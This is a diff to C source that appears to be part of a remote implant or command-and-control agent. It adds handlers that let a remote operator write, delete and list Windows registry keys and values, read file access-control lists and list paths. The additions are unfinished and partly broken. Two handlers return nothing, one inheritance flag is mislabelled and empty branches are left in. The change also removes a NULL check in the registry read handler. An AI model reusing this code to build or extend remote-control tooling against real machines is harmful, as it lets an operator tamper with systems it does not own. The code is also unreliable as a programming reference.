@@ -402,7 +402,6 @@ CLEANUP:
 	return pRespEnvelope;
 }
 
-
 LPSTR SocketAddressToStr
 (
 	_In_ LPSOCKADDR lpSockAddr
@@ -731,6 +730,164 @@ CLEANUP:
 	}
 
 	return pRespEnvelope;
+}
+
+PENVELOPE LsHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PPBElement pRecvElement = NULL;
+	PBUFFER* UnmarshalledData = NULL;
+	LPSTR lpPath = NULL;
+	LPSTR lpFileName = NULL;
+	LPSTR lpErrorDesc = NULL;
+	PENVELOPE pRespEnvelope = NULL;
+
+	pRecvElement = ALLOC(sizeof(PBElement));
+	pRecvElement->Type = Bytes;
+	pRecvElement->dwFieldIdx = 1;
+
+	UnmarshalledData = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (UnmarshalledData[0] == NULL) {
+		goto CLEANUP;
+	}
+
+	lpPath = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
+	if (!IsPathExist(lpPath)) {
+		lpErrorDesc = CreateFormattedErr(0, "%s is not exist", lpPath);
+		goto CLEANUP;
+	}
+
+	if (IsFileExist(lpPath)) {
+		PathRemoveFileSpecA(lpPath);
+		lpFileName = &lpPath[lstrlenA(lpPath) + 1];
+	}
+
+
+
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
+	if (UnmarshalledData != NULL) {
+		FreeBuffer(UnmarshalledData[0]);
+		FREE(UnmarshalledData);
+	}
+
+	if (lpPath != NULL) {
+		FREE(lpPath);
+	}
+
+	FreeElement(pRecvElement);
+}
+
+PENVELOPE IcaclsHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PPBElement pRecvElement = NULL;
+	PBUFFER* UnmarshalledData = NULL;
+	LPSTR lpPath = NULL;
+	LPSTR lpErrorDesc = NULL;
+	PENVELOPE pRespEnvelope = NULL;
+	PACL pAcl = NULL;
+	PACE_HEADER pAceHdr = NULL;
+	DWORD i = 0;
+	PSID pSid = NULL;
+	LPSTR lpSidName = NULL;
+	LPSTR lpRespData = NULL;
+	DWORD dwMask = 0;
+
+	pRecvElement = ALLOC(sizeof(PBElement));
+	pRecvElement->Type = Bytes;
+	pRecvElement->dwFieldIdx = 1;
+
+	UnmarshalledData = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (UnmarshalledData[0] == NULL) {
+		goto CLEANUP;
+	}
+
+	lpPath = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
+	if (!IsPathExist(lpPath)) {
+		lpErrorDesc = CreateFormattedErr(0, "%s is not exist", lpPath);
+		goto CLEANUP;
+	}
+
+	pAcl = GetFileSecurityDescriptor(lpPath);
+	pAceHdr = (PACE_HEADER)(&pAcl[1]);
+	for (i = 0; i < pAcl->AceCount; i++) {
+		pSid = (PSID)((ULONG_PTR)pAceHdr + 8);
+		if (IsValidSid(pSid)) {
+			lpSidName = LookupNameOfSid(pSid, TRUE);
+			if (lpSidName != NULL) {
+				lpRespData = StrCatExA(lpRespData, lpSidName);
+				lpRespData = StrCatExA(lpRespData, ":");
+			}
+		}
+
+		if (pAceHdr->AceFlags & INHERITED_ACE) {
+			lpRespData = StrCatExA(lpRespData, "(I)");
+		}
+
+		if (pAceHdr->AceFlags & OBJECT_INHERIT_ACE) {
+			lpRespData = StrCatExA(lpRespData, "(OI)");
+		}
+
+		if (pAceHdr->AceFlags & CONTAINER_INHERIT_ACE) {
+			lpRespData = StrCatExA(lpRespData, "(CI)");
+		}
+
+		if (pAceHdr->AceFlags & NO_PROPAGATE_INHERIT_ACE) {
+			lpRespData = StrCatExA(lpRespData, "(NP)");
+		}
+
+		if (pAceHdr->AceFlags & INHERIT_ONLY_ACE) {
+			lpRespData = StrCatExA(lpRespData, "(CI)");
+		}
+
+		if (pAceHdr->AceFlags & CRITICAL_ACE_FLAG) {
+			lpRespData = StrCatExA(lpRespData, "(CR)");
+		}
+
+		dwMask = *(PDWORD)((ULONG_PTR)pAceHdr + sizeof(ACE_HEADER));
+		if (pAceHdr->AceType == ACCESS_DENIED_ACE_TYPE) {
+			dwMask |= SYNCHRONIZE;
+		}
+
+		if (dwMask & DELETE) {
+
+		}
+		pAceHdr = (PACE_HEADER)((ULONG_PTR)pAceHdr + pAceHdr->AceSize);
+	}
+
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
+	if (UnmarshalledData != NULL) {
+		FreeBuffer(UnmarshalledData[0]);
+		FREE(UnmarshalledData);
+	}
+
+	if (lpPath != NULL) {
+		FREE(lpPath);
+	}
+
+	if (pAcl != NULL) {
+		FREE(pAcl);
+	}
+
+	if (lpRespData != NULL) {
+		FREE(lpRespData);
+	}
+
+	FreeElement(pRecvElement);
 }
 
 #define PH_NEXT_PROCESS(Process) ( \
@@ -1121,10 +1278,7 @@ PENVELOPE RegistryReadHandler
 
 	lpHive = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
 	lpPath = DuplicateStrA(UnmarshalledData[1]->pBuffer, 0);
-	if (UnmarshalledData[2] != NULL) {
-		lpValueName = DuplicateStrA(UnmarshalledData[2]->pBuffer, 0);
-	}
-
+	lpValueName = DuplicateStrA(UnmarshalledData[2]->pBuffer, 0);
 	if (!lstrcmpA(lpHive, "HKCR")) {
 		hRootKey = HKEY_CLASSES_ROOT;
 	}
@@ -1217,7 +1371,7 @@ PENVELOPE RegistryReadHandler
 	else if (dwValueType == REG_DWORD || dwValueType == REG_QWORD) {
 		lpFormattedValue = ALLOC(0x20);
 		if (dwValueType == REG_DWORD) {
-			sprintf(lpFormattedValue, "0x%08llx", *((PDWORD)(pData)));
+			sprintf(lpFormattedValue, "0x%08x", *((PDWORD)(pData)));
 		}
 		else {
 			sprintf(lpFormattedValue, "0x%08llx", *((PQWORD)(pData)));
@@ -1297,6 +1451,190 @@ CLEANUP:
 	return pRespEnvelope;
 }
 
+PENVELOPE RegistryWriteHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PENVELOPE pRespEnvelope = NULL;
+	PPBElement RecvElementList[10];
+	DWORD i = 0;
+	LPVOID* UnmarshalledData = NULL;
+	LPSTR lpHive = NULL;
+	LPSTR lpPath = NULL;
+	LPSTR lpValueName = NULL;
+	HKEY hRootKey = NULL;
+	HKEY hKey = NULL;
+	LSTATUS Status = ERROR_SUCCESS;
+	LPSTR lpErrorDesc = NULL;
+	LPSTR lpTemp = NULL;
+	PPBElement pFinalElement = NULL;
+	DWORD dwValueType = 0;
+	PBYTE pValue = NULL;
+	DWORD cbValue = NULL;
+
+	for (i = 0; i < _countof(RecvElementList); i++) {
+		RecvElementList[i] = ALLOC(sizeof(PBElement));
+		RecvElementList[i]->dwFieldIdx = i + 1;
+		RecvElementList[i]->Type = Bytes;
+	}
+
+	RecvElementList[6]->Type = Varint;
+	RecvElementList[7]->Type = Varint;
+	RecvElementList[9]->Type = Varint;
+	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (UnmarshalledData == NULL) {
+		goto CLEANUP;
+	}
+
+	if (UnmarshalledData[0] == NULL || UnmarshalledData[1] == NULL || UnmarshalledData[2] == NULL) {
+		goto CLEANUP;
+	}
+
+	dwValueType = (DWORD)UnmarshalledData[9];
+	if (dwValueType == 1) {
+		if (UnmarshalledData[5] == NULL) {
+			lpErrorDesc = CreateFormattedErr(0, "Binary value is not provided");
+			goto CLEANUP;
+		}
+
+		cbValue = ((PBUFFER)UnmarshalledData[5])->cbBuffer;
+		pValue = ALLOC(cbValue);
+		memcpy(pValue, ((PBUFFER)UnmarshalledData[5])->pBuffer, cbValue);
+		dwValueType = REG_BINARY;
+	}
+	else if (dwValueType == 3) {
+		cbValue = sizeof(DWORD);
+		pValue = ALLOC(cbValue);
+		memcpy(pValue, &UnmarshalledData[6], cbValue);
+		dwValueType = REG_DWORD;
+	}
+	else if (dwValueType == 4) {
+		cbValue = sizeof(QWORD);
+		pValue = ALLOC(cbValue);
+		memcpy(pValue, &UnmarshalledData[7], cbValue);
+		dwValueType = REG_QWORD;
+	}
+	else if (dwValueType == 2) {
+		if (UnmarshalledData[4] == NULL) {
+			lpErrorDesc = CreateFormattedErr(0, "String value is not provided");
+			goto CLEANUP;
+		}
+
+		cbValue = ((PBUFFER)UnmarshalledData[4])->cbBuffer + 1;
+		pValue = ALLOC(cbValue);
+		memcpy(pValue, ((PBUFFER)UnmarshalledData[4])->pBuffer, cbValue);
+		dwValueType = REG_SZ;
+	}
+
+	lpHive = DuplicateStrA(((PBUFFER)UnmarshalledData[0])->pBuffer, 0);
+	lpPath = DuplicateStrA(((PBUFFER)UnmarshalledData[1])->pBuffer, 0);
+	lpValueName = DuplicateStrA(((PBUFFER)UnmarshalledData[2])->pBuffer, 0);
+	if (!lstrcmpA(lpHive, "HKCR")) {
+		hRootKey = HKEY_CLASSES_ROOT;
+	}
+	else if (!lstrcmpA(lpHive, "HKCU")) {
+		hRootKey = HKEY_CURRENT_USER;
+	}
+	else if (!lstrcmpA(lpHive, "HKLM")) {
+		hRootKey = HKEY_LOCAL_MACHINE;
+	}
+	else if (!lstrcmpA(lpHive, "HKPD")) {
+		hRootKey = HKEY_PERFORMANCE_DATA;
+	}
+	else if (!lstrcmpA(lpHive, "HKU")) {
+		hRootKey = HKEY_USERS;
+	}
+	else if (!lstrcmpA(lpHive, "HKCC")) {
+		hRootKey = HKEY_CURRENT_CONFIG;
+	}
+	else {
+		goto CLEANUP;
+	}
+
+	lpTemp = DuplicateStrA(lpPath, 0);
+	lpTemp = StrCatExA(lpTemp, "\\");
+	lpTemp = StrCatExA(lpTemp, lpValueName);
+	Status = RegOpenKeyExA(hRootKey, lpTemp, 0, KEY_WRITE, &hKey);
+	if (Status == ERROR_FILE_NOT_FOUND) {
+		FREE(lpTemp);
+		Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_WRITE, &hKey);
+	}
+	else if (Status == ERROR_SUCCESS) {
+		FREE(lpPath);
+		lpPath = lpTemp;
+		FREE(lpValueName);
+		lpValueName = NULL;
+		if (dwValueType != REG_SZ) {
+			lpErrorDesc = CreateFormattedErr(0, "Cannot assign this registry type to default key value");
+			goto CLEANUP;
+		}
+	}
+
+	if (Status != ERROR_SUCCESS) {
+		lpErrorDesc = CreateFormattedErr(Status, "RegOpenKeyExA failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	Status = RegSetValueExA(hKey, lpValueName, 0, dwValueType, pValue, cbValue);
+	if (Status != ERROR_SUCCESS) {
+		lpErrorDesc = CreateFormattedErr(Status, "RegSetValueExA failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	pFinalElement = CreateStructElement(NULL, 0, 9);
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
+	pFinalElement->pMarshalledData = NULL;
+	pFinalElement->cbMarshalledData = 0;
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
+	if (UnmarshalledData != NULL) {
+		for (i = 0; i < _countof(RecvElementList); i++) {
+			if (RecvElementList[i]->Type != Varint) {
+				FreeBuffer(UnmarshalledData[i]);
+			}
+		}
+
+		FREE(UnmarshalledData);
+	}
+
+	for (i = 0; i < _countof(RecvElementList); i++) {
+		FreeElement(RecvElementList[i]);
+	}
+
+	if (hKey != NULL) {
+		RegCloseKey(hKey);
+	}
+
+	if (lpPath != NULL) {
+		FREE(lpPath);
+	}
+
+	if (lpHive != NULL) {
+		FREE(lpHive);
+	}
+
+	if (lpValueName != NULL) {
+		FREE(lpValueName);
+	}
+
+	if (pValue != NULL) {
+		FREE(pValue);
+	}
+
+	FreeElement(pFinalElement);
+
+	return pRespEnvelope;
+}
+
 PENVELOPE RegistryCreateKeyHandler
 (
 	_In_ PENVELOPE pEnvelope
@@ -1366,7 +1704,6 @@ PENVELOPE RegistryCreateKeyHandler
 	}
 	
 	pFinalElement = CreateStructElement(NULL, 0, 9);
-	HexDump(pFinalElement->pMarshalledData, pFinalElement->cbMarshalledData);
 	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
 	pRespEnvelope->uID = pEnvelope->uID;
 	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
@@ -1402,6 +1739,460 @@ CLEANUP:
 
 	if (lpHive != NULL) {
 		FREE(lpHive);
+	}
+
+	if (lpKeyName != NULL) {
+		FREE(lpKeyName);
+	}
+
+	if (lpTemp != NULL) {
+		FREE(lpTemp);
+	}
+
+	FreeElement(pFinalElement);
+
+	return pRespEnvelope;
+}
+
+PENVELOPE RegistryDeleteKeyHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PENVELOPE pRespEnvelope = NULL;
+	PPBElement RecvElementList[3];
+	DWORD i = 0;
+	PBUFFER* UnmarshalledData = NULL;
+	LPSTR lpHive = NULL;
+	LPSTR lpPath = NULL;
+	LPSTR lpValueName = NULL;
+	LPSTR lpKeyName = NULL;
+	HKEY hRootKey = NULL;
+	HKEY hKey = NULL;
+	LSTATUS Status = ERROR_SUCCESS;
+	LPSTR lpErrorDesc = NULL;
+	LPSTR lpTemp = NULL;
+	PPBElement pFinalElement = NULL;
+
+	for (i = 0; i < _countof(RecvElementList); i++) {
+		RecvElementList[i] = ALLOC(sizeof(PBElement));
+		RecvElementList[i]->dwFieldIdx = i + 1;
+		RecvElementList[i]->Type = Bytes;
+	}
+
+	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (UnmarshalledData == NULL) {
+		goto CLEANUP;
+	}
+
+	if (UnmarshalledData[0] == NULL || UnmarshalledData[1] == NULL || UnmarshalledData[2] == NULL) {
+		goto CLEANUP;
+	}
+
+	lpHive = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
+	lpPath = DuplicateStrA(UnmarshalledData[1]->pBuffer, 0);
+	lpValueName = DuplicateStrA(UnmarshalledData[2]->pBuffer, 0);
+	if (!lstrcmpA(lpHive, "HKCR")) {
+		hRootKey = HKEY_CLASSES_ROOT;
+	}
+	else if (!lstrcmpA(lpHive, "HKCU")) {
+		hRootKey = HKEY_CURRENT_USER;
+	}
+	else if (!lstrcmpA(lpHive, "HKLM")) {
+		hRootKey = HKEY_LOCAL_MACHINE;
+	}
+	else if (!lstrcmpA(lpHive, "HKPD")) {
+		hRootKey = HKEY_PERFORMANCE_DATA;
+	}
+	else if (!lstrcmpA(lpHive, "HKU")) {
+		hRootKey = HKEY_USERS;
+	}
+	else if (!lstrcmpA(lpHive, "HKCC")) {
+		hRootKey = HKEY_CURRENT_CONFIG;
+	}
+	else {
+		goto CLEANUP;
+	}
+
+	lpTemp = DuplicateStrA(lpPath, 0);
+	lpTemp = StrCatExA(lpTemp, "\\");
+	lpTemp = StrCatExA(lpTemp, lpValueName);
+	Status = RegOpenKeyExA(hRootKey, lpTemp, 0, KEY_QUERY_VALUE, &hKey);
+	if (Status == ERROR_SUCCESS) {
+		lpKeyName = lpValueName;
+		lpValueName = NULL;
+	}
+	else if (Status != ERROR_FILE_NOT_FOUND) {
+		lpErrorDesc = CreateFormattedErr(Status, "RegOpenKeyExA failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	RegCloseKey(hKey);
+	Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_WRITE, &hKey);
+	if (Status != ERROR_SUCCESS) {
+		lpErrorDesc = CreateFormattedErr(Status, "RegOpenKeyExA failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	if (lpValueName == NULL) {
+		Status = RegDeleteKeyA(hKey, lpKeyName);
+		if (Status != ERROR_SUCCESS) {
+			lpErrorDesc = CreateFormattedErr(Status, "RegDeleteKeyA failed at %s", __FUNCTION__);
+			goto CLEANUP;
+		}
+	}
+	else {
+		Status = RegDeleteValueA(hKey, lpValueName);
+		if (Status != ERROR_SUCCESS) {
+			lpErrorDesc = CreateFormattedErr(Status, "RegDeleteValueA failed at %s", __FUNCTION__);
+			goto CLEANUP;
+		}
+	}
+
+	pFinalElement = CreateStructElement(NULL, 0, 9);
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
+	pFinalElement->pMarshalledData = NULL;
+	pFinalElement->cbMarshalledData = 0;
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
+	if (UnmarshalledData != NULL) {
+		for (i = 0; i < _countof(RecvElementList); i++) {
+			FreeBuffer(UnmarshalledData[i]);
+		}
+
+		FREE(UnmarshalledData);
+	}
+
+	for (i = 0; i < _countof(RecvElementList); i++) {
+		FreeElement(RecvElementList[i]);
+	}
+
+	if (hKey != NULL) {
+		RegCloseKey(hKey);
+	}
+
+	if (lpPath != NULL) {
+		FREE(lpPath);
+	}
+
+	if (lpHive != NULL) {
+		FREE(lpHive);
+	}
+
+	if (lpValueName != NULL) {
+		FREE(lpValueName);
+	}
+
+	if (lpKeyName != NULL) {
+		FREE(lpKeyName);
+	}
+
+	if (lpTemp != NULL) {
+		FREE(lpTemp);
+	}
+
+	FreeElement(pFinalElement);
+
+	return pRespEnvelope;
+}
+
+PENVELOPE RegistrySubKeysListHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PENVELOPE pRespEnvelope = NULL;
+	PPBElement RecvElementList[2];
+	PBUFFER* pSubKeys = NULL;
+	DWORD i = 0;
+	PBUFFER* UnmarshalledData = NULL;
+	LPSTR lpHive = NULL;
+	LPSTR lpPath = NULL;
+	HKEY hRootKey = NULL;
+	HKEY hKey = NULL;
+	LSTATUS Status = ERROR_SUCCESS;
+	LPSTR lpErrorDesc = NULL;
+	PPBElement pFinalElement = NULL;
+	DWORD cSubKeys = 0;
+	DWORD dwMaxSubKeyLength = 0;
+
+	for (i = 0; i < _countof(RecvElementList); i++) {
+		RecvElementList[i] = ALLOC(sizeof(PBElement));
+		RecvElementList[i]->dwFieldIdx = i + 1;
+		RecvElementList[i]->Type = Bytes;
+	}
+
+	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (UnmarshalledData == NULL) {
+		goto CLEANUP;
+	}
+
+	if (UnmarshalledData[0] == NULL || UnmarshalledData[1] == NULL) {
+		goto CLEANUP;
+	}
+
+	lpHive = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
+	lpPath = DuplicateStrA(UnmarshalledData[1]->pBuffer, 0);
+	if (!lstrcmpA(lpHive, "HKCR")) {
+		hRootKey = HKEY_CLASSES_ROOT;
+	}
+	else if (!lstrcmpA(lpHive, "HKCU")) {
+		hRootKey = HKEY_CURRENT_USER;
+	}
+	else if (!lstrcmpA(lpHive, "HKLM")) {
+		hRootKey = HKEY_LOCAL_MACHINE;
+	}
+	else if (!lstrcmpA(lpHive, "HKPD")) {
+		hRootKey = HKEY_PERFORMANCE_DATA;
+	}
+	else if (!lstrcmpA(lpHive, "HKU")) {
+		hRootKey = HKEY_USERS;
+	}
+	else if (!lstrcmpA(lpHive, "HKCC")) {
+		hRootKey = HKEY_CURRENT_CONFIG;
+	}
+	else {
+		goto CLEANUP;
+	}
+
+	Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_READ, &hKey);
+	if (Status != ERROR_SUCCESS) {
+		lpErrorDesc = CreateFormattedErr(Status, "RegOpenKeyExA failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	Status = RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &cSubKeys, &dwMaxSubKeyLength, NULL, NULL, NULL, NULL, NULL, NULL);
+	if (Status != ERROR_SUCCESS) {
+		lpErrorDesc = CreateFormattedErr(Status, "RegQueryInfoKeyA failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	pSubKeys = ALLOC(sizeof(PBUFFER) * cSubKeys);
+	for (i = 0; i < cSubKeys; i++) {
+		pSubKeys[i] = ALLOC(sizeof(BUFFER));
+		pSubKeys[i]->cbBuffer = dwMaxSubKeyLength + 1;
+		pSubKeys[i]->pBuffer = ALLOC(pSubKeys[i]->cbBuffer);
+		Status = RegEnumKeyExA(hKey, i, pSubKeys[i]->pBuffer, &pSubKeys[i]->cbBuffer, NULL, NULL, NULL, NULL);
+		if (Status == ERROR_MORE_DATA) {
+			pSubKeys[i]->cbBuffer += 1;
+			pSubKeys[i]->pBuffer = REALLOC(pSubKeys[i]->pBuffer, pSubKeys[i]->cbBuffer);
+			Status = RegEnumKeyExA(hKey, i, pSubKeys[i]->pBuffer, &pSubKeys[i]->cbBuffer, NULL, NULL, NULL, NULL);
+			if (Status != ERROR_SUCCESS) {
+				lpErrorDesc = CreateFormattedErr(Status, "RegEnumKeyExA failed at %s", __FUNCTION__);
+				goto CLEANUP;
+			}
+		}
+		else if (Status == ERROR_NO_MORE_ITEMS) {
+			break;
+		}
+		else if (Status != ERROR_SUCCESS) {
+			lpErrorDesc = CreateFormattedErr(Status, "RegEnumKeyExA failed at %s", __FUNCTION__);
+			goto CLEANUP;
+		}
+
+		pSubKeys[i]->cbBuffer = lstrlenA(pSubKeys[i]->pBuffer);
+	}
+
+	pFinalElement = CreateRepeatedBytesElement(pSubKeys, i, 1);
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
+	pFinalElement->pMarshalledData = NULL;
+	pFinalElement->cbMarshalledData = 0;
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
+	if (UnmarshalledData != NULL) {
+		for (i = 0; i < _countof(RecvElementList); i++) {
+			FreeBuffer(UnmarshalledData[i]);
+		}
+
+		FREE(UnmarshalledData);
+	}
+
+	for (i = 0; i < _countof(RecvElementList); i++) {
+		FreeElement(RecvElementList[i]);
+	}
+
+	if (hKey != NULL) {
+		RegCloseKey(hKey);
+	}
+
+	if (lpPath != NULL) {
+		FREE(lpPath);
+	}
+
+	if (lpHive != NULL) {
+		FREE(lpHive);
+	}
+
+	if (pSubKeys != NULL) {
+		for (i = 0; i < cSubKeys; i++) {
+			FreeBuffer(pSubKeys[i]);
+		}
+
+		FREE(pSubKeys);
+	}
+
+	FreeElement(pFinalElement);
+
+	return pRespEnvelope;
+}
+
+PENVELOPE RegistryListValuesHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PENVELOPE pRespEnvelope = NULL;
+	PPBElement RecvElementList[2];
+	PBUFFER* pValues = NULL;
+	DWORD i = 0;
+	PBUFFER* UnmarshalledData = NULL;
+	LPSTR lpHive = NULL;
+	LPSTR lpPath = NULL;
+	HKEY hRootKey = NULL;
+	HKEY hKey = NULL;
+	LSTATUS Status = ERROR_SUCCESS;
+	LPSTR lpErrorDesc = NULL;
+	PPBElement pFinalElement = NULL;
+	DWORD cValues = 0;
+	DWORD dwMaxValueNameLength = 0;
+
+	for (i = 0; i < _countof(RecvElementList); i++) {
+		RecvElementList[i] = ALLOC(sizeof(PBElement));
+		RecvElementList[i]->dwFieldIdx = i + 1;
+		RecvElementList[i]->Type = Bytes;
+	}
+
+	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (UnmarshalledData == NULL) {
+		goto CLEANUP;
+	}
+
+	if (UnmarshalledData[0] == NULL || UnmarshalledData[1] == NULL) {
+		goto CLEANUP;
+	}
+
+	lpHive = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
+	lpPath = DuplicateStrA(UnmarshalledData[1]->pBuffer, 0);
+	if (!lstrcmpA(lpHive, "HKCR")) {
+		hRootKey = HKEY_CLASSES_ROOT;
+	}
+	else if (!lstrcmpA(lpHive, "HKCU")) {
+		hRootKey = HKEY_CURRENT_USER;
+	}
+	else if (!lstrcmpA(lpHive, "HKLM")) {
+		hRootKey = HKEY_LOCAL_MACHINE;
+	}
+	else if (!lstrcmpA(lpHive, "HKPD")) {
+		hRootKey = HKEY_PERFORMANCE_DATA;
+	}
+	else if (!lstrcmpA(lpHive, "HKU")) {
+		hRootKey = HKEY_USERS;
+	}
+	else if (!lstrcmpA(lpHive, "HKCC")) {
+		hRootKey = HKEY_CURRENT_CONFIG;
+	}
+	else {
+		goto CLEANUP;
+	}
+
+	Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_READ, &hKey);
+	if (Status != ERROR_SUCCESS) {
+		lpErrorDesc = CreateFormattedErr(Status, "RegOpenKeyExA failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	Status = RegQueryInfoKeyA(hKey, NULL, NULL, NULL, NULL, NULL, NULL, &cValues, &dwMaxValueNameLength, NULL, NULL, NULL);
+	if (Status != ERROR_SUCCESS) {
+		lpErrorDesc = CreateFormattedErr(Status, "RegQueryInfoKeyA failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	pValues = ALLOC(sizeof(PBUFFER) * cValues);
+	for (i = 0; i < cValues; i++) {
+		pValues[i] = ALLOC(sizeof(BUFFER));
+		pValues[i]->cbBuffer = dwMaxValueNameLength + 1;
+		pValues[i]->pBuffer = ALLOC(pValues[i]->cbBuffer);
+		Status = RegEnumValueA(hKey, i, pValues[i]->pBuffer, &pValues[i]->cbBuffer, NULL, NULL, NULL, NULL);
+		if (Status == ERROR_MORE_DATA) {
+			pValues[i]->cbBuffer += 1;
+			pValues[i]->pBuffer = REALLOC(pValues[i]->pBuffer, pValues[i]->cbBuffer);
+			Status = RegEnumValueA(hKey, i, pValues[i]->pBuffer, &pValues[i]->cbBuffer, NULL, NULL, NULL, NULL);
+			if (Status != ERROR_SUCCESS) {
+				lpErrorDesc = CreateFormattedErr(Status, "RegEnumKeyExA failed at %s", __FUNCTION__);
+				goto CLEANUP;
+			}
+		}
+		else if (Status == ERROR_NO_MORE_ITEMS) {
+			break;
+		}
+		else if (Status != ERROR_SUCCESS) {
+			lpErrorDesc = CreateFormattedErr(Status, "RegEnumKeyExA failed at %s", __FUNCTION__);
+			goto CLEANUP;
+		}
+
+		pValues[i]->cbBuffer = lstrlenA(pValues[i]->pBuffer);
+	}
+
+	pFinalElement = CreateRepeatedBytesElement(pValues, i, 1);
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
+	pFinalElement->pMarshalledData = NULL;
+	pFinalElement->cbMarshalledData = 0;
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
+	if (UnmarshalledData != NULL) {
+		for (i = 0; i < _countof(RecvElementList); i++) {
+			FreeBuffer(UnmarshalledData[i]);
+		}
+
+		FREE(UnmarshalledData);
+	}
+
+	for (i = 0; i < _countof(RecvElementList); i++) {
+		FreeElement(RecvElementList[i]);
+	}
+
+	if (hKey != NULL) {
+		RegCloseKey(hKey);
+	}
+
+	if (lpPath != NULL) {
+		FREE(lpPath);
+	}
+
+	if (lpHive != NULL) {
+		FREE(lpHive);
+	}
+
+	if (pValues != NULL) {
+		for (i = 0; i < cValues; i++) {
+			FreeBuffer(pValues[i]);
+		}
+
+		FREE(pValues);
 	}
 
 	FreeElement(pFinalElement);
@@ -1505,19 +2296,19 @@ VOID MainHandler
 		pResp = RegistryReadHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgRegistryWriteReq) {
-		
+		pResp = RegistryWriteHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgRegistryCreateKeyReq) {
 		pResp = RegistryCreateKeyHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgRegistryDeleteKeyReq) {
-	
+		pResp = RegistryDeleteKeyHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgRegistrySubKeysListReq) {
-	
+		pResp = RegistrySubKeysListHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgRegistryListValuesReq) {
-	
+		pResp = RegistryListValuesHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgServicesReq) {
 	
